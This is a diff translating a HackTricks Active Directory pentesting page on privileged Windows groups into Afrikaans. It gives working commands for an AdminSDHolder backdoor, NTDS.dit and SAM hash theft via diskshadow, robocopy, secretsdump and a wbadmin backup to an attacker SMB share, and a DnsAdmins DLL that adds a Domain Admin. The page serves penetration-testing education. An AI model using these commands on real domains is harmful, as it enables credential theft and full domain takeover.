@@ -1,120 +1,103 @@
-# Privileged Groups
+# Bevoorregte Groepe
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Ander maniere om HackTricks te ondersteun:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.
 
 </details>
 
-## Well Known groups with administration privileges
+## Bekende groepe met administratiewe voorregte
 
 * **Administrators**
 * **Domain Admins**
 * **Enterprise Admins**
 
-## Account Operators
+## Rekeningoperateurs
 
-This group is empowered to create accounts and groups that are not administrators on the domain. Additionally, it enables local login to the Domain Controller (DC).
+Hierdie groep is gemagtig om rekeninge en groepe te skep wat nie administrateurs op die domein is nie. Daarbenewens maak dit plaaslike aanmelding by die Domeinbeheerder (DC) moontlik.
 
-To identify the members of this group, the following command is executed:
-
+Om die lede van hierdie groep te identifiseer, word die volgende opdrag uitgevoer:
 ```powershell
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
+Die byvoeg van nuwe gebruikers is toegelaat, sowel as plaaslike aanmelding by DC01.
 
-Adding new users is permitted, as well as local login to DC01.
+## AdminSDHolder-groep
 
-## AdminSDHolder group
+Die **AdminSDHolder**-groep se Toegangbeheerlys (ACL) is van kritieke belang, aangesien dit toestemmings stel vir alle "beskermde groepe" binne Active Directory, insluitend hoë-voorreggroep. Hierdie meganisme verseker die veiligheid van hierdie groepe deur ongemagtigde wysigings te voorkom.
 
-The **AdminSDHolder** group's Access Control List (ACL) is crucial as it sets permissions for all "protected groups" within Active Directory, including high-privilege groups. This mechanism ensures the security of these groups by preventing unauthorized modifications.
+'n Aanvaller kan dit uitbuit deur die ACL van die **AdminSDHolder**-groep te wysig en volle toestemmings aan 'n standaardgebruiker te verleen. Dit sal hierdie gebruiker effektief volle beheer oor alle beskermde groepe gee. As hierdie gebruiker se toestemmings gewysig of verwyder word, sal dit binne 'n uur outomaties herstel word as gevolg van die stelsel se ontwerp.
 
-An attacker could exploit this by modifying the **AdminSDHolder** group's ACL, granting full permissions to a standard user. This would effectively give that user full control over all protected groups. If this user's permissions are altered or removed, they would be automatically reinstated within an hour due to the system's design.
-
-Commands to review the members and modify permissions include:
-
+Opdragte om die lede te hersien en toestemmings te wysig, sluit in:
 ```powershell
 Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
 ```
+'n Skrip is beskikbaar om die herstelproses te versnel: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
 
-A script is available to expedite the restoration process: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
+Vir meer besonderhede, besoek [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).
 
-For more details, visit [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).
+## AD Herwin Binne
 
-## AD Recycle Bin
-
-Membership in this group allows for the reading of deleted Active Directory objects, which can reveal sensitive information:
-
+Lidmaatskap in hierdie groep maak dit moontlik om uitgevee Active Directory-voorwerpe te lees, wat sensitiewe inligting kan onthul:
 ```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
+### Toegang tot domeinbeheerder
 
-### Domain Controller Access
+Toegang tot bestanden op de DC is beperk, tensy die gebruiker deel is van die `Server Operators`-groep, wat die vlak van toegang verander.
 
-Access to files on the DC is restricted unless the user is part of the `Server Operators` group, which changes the level of access.
+### Privilege-escalasie
 
-### Privilege Escalation
-
-Using `PsService` or `sc` from Sysinternals, one can inspect and modify service permissions. The `Server Operators` group, for instance, has full control over certain services, allowing for the execution of arbitrary commands and privilege escalation:
-
+Deur `PsService` of `sc` van Sysinternals te gebruik, kan 'n persoon diensmachtigings ondersoek en wysig. Die `Server Operators`-groep het byvoorbeeld volle beheer oor sekere dienste, wat die uitvoering van willekeurige opdragte en privilege-escalasie moontlik maak:
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
-
-This command reveals that `Server Operators` have full access, enabling the manipulation of services for elevated privileges.
+Hierdie bevel onthul dat `Server Operators` volle toegang het, wat die manipulasie van dienste vir verhoogde bevoegdhede moontlik maak.
 
 ## Backup Operators
 
-Membership in the `Backup Operators` group provides access to the `DC01` file system due to the `SeBackup` and `SeRestore` privileges. These privileges enable folder traversal, listing, and file copying capabilities, even without explicit permissions, using the `FILE_FLAG_BACKUP_SEMANTICS` flag. Utilizing specific scripts is necessary for this process.
+Lidmaatskap in die `Backup Operators` groep bied toegang tot die `DC01` lêersisteem as gevolg van die `SeBackup` en `SeRestore` bevoegdhede. Hierdie bevoegdhede maak vouer deursoeking, lys en lêerkopieer-vermoëns moontlik, selfs sonder uitdruklike toestemmings, deur die gebruik van die `FILE_FLAG_BACKUP_SEMANTICS` vlag. Die gebruik van spesifieke skripte is nodig vir hierdie proses.
 
-To list group members, execute:
-
+Om groeplede te lys, voer uit:
 ```powershell
 Get-NetGroupMember -Identity "Backup Operators" -Recurse
 ```
+### Plaaslike Aanval
 
-### Local Attack
+Om hierdie voorregte plaaslik te benut, word die volgende stappe gevolg:
 
-To leverage these privileges locally, the following steps are employed:
-
-1. Import necessary libraries:
-
+1. Voer nodige biblioteke in:
 ```bash
 Import-Module .\SeBackupPrivilegeUtils.dll
 Import-Module .\SeBackupPrivilegeCmdLets.dll
 ```
-
-2. Enable and verify `SeBackupPrivilege`:
-
+2. Aktiveer en verifieer `SeBackupPrivilege`:
 ```bash
 Set-SeBackupPrivilege
 Get-SeBackupPrivilege
 ```
-
-3. Access and copy files from restricted directories, for instance:
-
+3. Toegang en kopieer lêers vanaf beperkte gidsies, byvoorbeeld:
 ```bash
 dir C:\Users\Administrator\
 Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
 ```
+### AD Aanval
 
-### AD Attack
+Direkte toegang tot die lêersisteem van die Domeinbeheerder maak dit moontlik om die `NTDS.dit` databasis te steel, wat al die NTLM-hashes vir domein gebruikers en rekenaars bevat.
 
-Direct access to the Domain Controller's file system allows for the theft of the `NTDS.dit` database, which contains all NTLM hashes for domain users and computers.
+#### Gebruik van diskshadow.exe
 
-#### Using diskshadow.exe
-
-1. Create a shadow copy of the `C` drive:
-
+1. Skep 'n skadukopie van die `C`-aandrywing:
 ```cmd
 diskshadow.exe
 set verbose on
@@ -127,70 +110,59 @@ expose %cdrive% F:
 end backup
 exit
 ```
-
-2. Copy `NTDS.dit` from the shadow copy:
-
+2. Kopieer `NTDS.dit` vanaf die skadukopie:
 ```cmd
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
-
-Alternatively, use `robocopy` for file copying:
-
+Alternatiewelik, gebruik `robocopy` vir lêerkopiëring:
 ```cmd
 robocopy /B F:\Windows\NTDS .\ntds ntds.dit
 ```
-
-3. Extract `SYSTEM` and `SAM` for hash retrieval:
-
+3. Haal `SYSTEM` en `SAM` uit vir hashtrekking:
 ```cmd
 reg save HKLM\SYSTEM SYSTEM.SAV
 reg save HKLM\SAM SAM.SAV
 ```
-
-4. Retrieve all hashes from `NTDS.dit`:
-
+4. Haal alle hasings uit `NTDS.dit` op:
 ```shell-session
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
+#### Gebruik van wbadmin.exe
 
-#### Using wbadmin.exe
+1. Stel NTFS-lêersisteem op vir SMB-bediener op aanvaller se masjien en stoor SMB-legitimasie op teikengreepmasjien.
+2. Gebruik `wbadmin.exe` vir stelselrugsteun en `NTDS.dit`-onttrekking:
+```cmd
+net use X: \\<AanvalIP>\deelnaam /user:smbgebruiker wagwoord
+echo "Y" | wbadmin start backup -backuptarget:\\<AanvalIP>\deelnaam -include:c:\windows\ntds
+wbadmin get versions
+echo "Y" | wbadmin start recovery -version:<datum-tyd> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
+```
 
-1. Set up NTFS filesystem for SMB server on attacker machine and cache SMB credentials on the target machine.
-2. Use `wbadmin.exe` for system backup and `NTDS.dit` extraction:
-    ```cmd
-    net use X: \\<AttackIP>\sharename /user:smbuser password
-    echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
-    wbadmin get versions
-    echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
-    ```
-
-For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).
+Vir 'n praktiese demonstrasie, sien [DEMO VIDEO MET IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).
 
 ## DnsAdmins
 
-Members of the **DnsAdmins** group can exploit their privileges to load an arbitrary DLL with SYSTEM privileges on a DNS server, often hosted on Domain Controllers. This capability allows for significant exploitation potential.
+Lede van die **DnsAdmins**-groep kan hul voorregte benut om 'n willekeurige DLL met SISTEEM-voorregte op 'n DNS-bediener te laai, wat dikwels op Domeinbeheerders gehuisves word. Hierdie vermoë bied aansienlike uitbuitingspotensiaal.
 
-To list members of the DnsAdmins group, use:
-
+Om lede van die DnsAdmins-groep te lys, gebruik:
 ```powershell
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
+### Voer willekeurige DLL uit
 
-### Execute arbitrary DLL
-
-Members can make the DNS server load an arbitrary DLL (either locally or from a remote share) using commands such as:
-
+Lede kan die DNS-bediener dwing om 'n willekeurige DLL te laai (plaaslik of van 'n afgeleë deel) deur gebruik te maak van opdragte soos:
 ```powershell
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
 An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
 ```
+
 ```c
 // Modify DLL to add user
 DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
 {
-    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
-    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
+system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
+system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
 }
 ```
 
@@ -198,99 +170,81 @@ DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunct
 // Generate DLL with msfvenom
 msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
 ```
-
-Restarting the DNS service (which may require additional permissions) is necessary for the DLL to be loaded:
-
+Die herlaai van die DNS-diens (wat moontlik addisionele toestemmings vereis) is noodsaaklik vir die DLL om gelaai te word:
 ```csharp
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
-
-For more details on this attack vector, refer to ired.team.
+Vir meer besonderhede oor hierdie aanvalsmetode, verwys na ired.team.
 
 #### Mimilib.dll
-It's also feasible to use mimilib.dll for command execution, modifying it to execute specific commands or reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.
+Dit is ook moontlik om mimilib.dll te gebruik vir opdraguitvoering deur dit te wysig om spesifieke opdragte of omgekeerde skulpe uit te voer. [Kyk na hierdie pos](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) vir meer inligting.
 
-### WPAD Record for MitM
-DnsAdmins can manipulate DNS records to perform Man-in-the-Middle (MitM) attacks by creating a WPAD record after disabling the global query block list. Tools like Responder or Inveigh can be used for spoofing and capturing network traffic.
+### WPAD-rekord vir MitM
+DnsAdmins kan DNS-rekords manipuleer om Man-in-the-Middle (MitM) aanvalle uit te voer deur 'n WPAD-rekord te skep nadat die globale navraagbloklys gedeaktiveer is. Hulpmiddels soos Responder of Inveigh kan gebruik word vir vervalsing en die vaslegging van netwerkverkeer.
 
-### Event Log Readers
-Members can access event logs, potentially finding sensitive information such as plaintext passwords or command execution details:
-
+### Event Log Lesers
+Lede kan toegang verkry tot gebeurtenislogs en moontlik sensitiewe inligting vind, soos platte teks wagwoorde of opdraguitvoeringsbesonderhede:
 ```powershell
 # Get members and search logs for sensitive information
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
 ```
-
-## Exchange Windows Permissions
-This group can modify DACLs on the domain object, potentially granting DCSync privileges. Techniques for privilege escalation exploiting this group are detailed in Exchange-AD-Privesc GitHub repo.
-
+## Uitruil van Windows-toestemmings
+Hierdie groep kan DACL's op die domeinobjek wysig en moontlik DCSync-voorregte verleen. Tegnieke vir voorregverhoging wat hierdie groep uitbuit, word in die Exchange-AD-Privesc GitHub-opslagplek in detail beskryf.
 ```powershell
 # List members
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
+## Hyper-V Administrateurs
+Hyper-V Administrateurs het volle toegang tot Hyper-V, wat uitgebuit kan word om beheer oor gevirtualiseerde Domein Kontroleerders te verkry. Dit sluit die kloning van lewendige DC's en die onttrekking van NTLM-hashes uit die NTDS.dit-lêer in.
 
-## Hyper-V Administrators
-Hyper-V Administrators have full access to Hyper-V, which can be exploited to gain control over virtualized Domain Controllers. This includes cloning live DCs and extracting NTLM hashes from the NTDS.dit file.
-
-### Exploitation Example
-Firefox's Mozilla Maintenance Service can be exploited by Hyper-V Administrators to execute commands as SYSTEM. This involves creating a hard link to a protected SYSTEM file and replacing it with a malicious executable:
-
+### Exploitasie Voorbeeld
+Firefox se Mozilla Maintenance Service kan deur Hyper-V Administrateurs uitgebuit word om opdragte as SYSTEM uit te voer. Dit behels die skep van 'n harde skakel na 'n beskermde SYSTEM-lêer en dit te vervang met 'n skadelike uitvoerbare lêer:
 ```bash
 # Take ownership and start the service
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 sc.exe start MozillaMaintenance
 ```
+Nota: Hardlink-uitbuiting is in onlangse Windows-opdaterings geminimaliseer.
 
-Note: Hard link exploitation has been mitigated in recent Windows updates.
+## Organisasiebestuur
 
-## Organization Management
+In omgewings waar **Microsoft Exchange** geïmplementeer is, het 'n spesiale groep genaamd **Organisasiebestuur** aansienlike bevoegdhede. Hierdie groep het die voorreg om **toegang te verkry tot die posbusse van alle domein-gebruikers** en behou **volle beheer oor die 'Microsoft Exchange Security Groups'** Organisasie-eenheid (OU). Hierdie beheer sluit die **`Exchange Windows Permissions`** groep in, wat uitgebuit kan word vir bevoorregte eskalasie.
 
-In environments where **Microsoft Exchange** is deployed, a special group known as **Organization Management** holds significant capabilities. This group is privileged to **access the mailboxes of all domain users** and maintains **full control over the 'Microsoft Exchange Security Groups'** Organizational Unit (OU). This control includes the **`Exchange Windows Permissions`** group, which can be exploited for privilege escalation.
+### Bevoorregte Uitbuiting en Opdragte
 
-### Privilege Exploitation and Commands
+#### Drukkersoperateurs
+Lede van die **Drukkersoperateurs**-groep het verskeie bevoegdhede, insluitend die **`SeLoadDriverPrivilege`**, wat hulle in staat stel om **plaaslik aan te meld by 'n Domeinbeheerder**, dit af te skakel en drukkers te bestuur. Om hierdie bevoegdhede uit te buit, veral as **`SeLoadDriverPrivilege`** nie sigbaar is onder 'n nie-verhoogde konteks nie, is dit nodig om Gebruikersrekeningbeheer (UAC) te omseil.
 
-#### Print Operators
-Members of the **Print Operators** group are endowed with several privileges, including the **`SeLoadDriverPrivilege`**, which allows them to **log on locally to a Domain Controller**, shut it down, and manage printers. To exploit these privileges, especially if **`SeLoadDriverPrivilege`** is not visible under an unelevated context, bypassing User Account Control (UAC) is necessary.
-
-To list the members of this group, the following PowerShell command is used:
-
+Om die lede van hierdie groep te lys, word die volgende PowerShell-opdrag gebruik:
 ```powershell
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
+Vir meer gedetailleerde uitbuitingstegnieke wat verband hou met **`SeLoadDriverPrivilege`**, moet jy spesifieke sekuriteitsbronne raadpleeg.
 
-For more detailed exploitation techniques related to **`SeLoadDriverPrivilege`**, one should consult specific security resources.
-
-#### Remote Desktop Users
-This group's members are granted access to PCs via Remote Desktop Protocol (RDP). To enumerate these members, PowerShell commands are available:
-
+#### Remote Desktop-gebruikers
+Lede van hierdie groep het toegang tot rekenaars via die Remote Desktop Protocol (RDP). Om hierdie lede op te som, is daar beskikbare PowerShell-opdragte:
 ```powershell
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
 ```
+Verdere insigte oor die uitbuiting van RDP kan gevind word in toegewyde pentesting-bronne.
 
-Further insights into exploiting RDP can be found in dedicated pentesting resources.
-
-#### Remote Management Users
-Members can access PCs over **Windows Remote Management (WinRM)**. Enumeration of these members is achieved through:
-
+#### Remote-bestuursgebruikers
+Lede kan toegang verkry tot rekenaars via **Windows Remote Management (WinRM)**. Enumerasie van hierdie lede word bereik deur middel van:
 ```powershell
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
+Vir uitbuitingstegnieke wat verband hou met **WinRM**, moet spesifieke dokumentasie geraadpleeg word.
 
-For exploitation techniques related to **WinRM**, specific documentation should be consulted.
-
-#### Server Operators
-This group has permissions to perform various configurations on Domain Controllers, including backup and restore privileges, changing system time, and shutting down the system. To enumerate the members, the command provided is:
-
+#### Bedieningsoperateurs
+Hierdie groep het toestemmings om verskeie konfigurasies op Domeinbeheerders uit te voer, insluitend rugsteun- en herstelregte, verandering van stelseltyd en afsluiting van die stelsel. Om die lede op te som, word die volgende opdrag verskaf:
 ```powershell
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
-
-
-## References <a href="#references" id="references"></a>
+## Verwysings <a href="#verwysings" id="verwysings"></a>
 
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
 * [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
@@ -309,14 +263,14 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Ander maniere om HackTricks te ondersteun:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.
 
 </details>
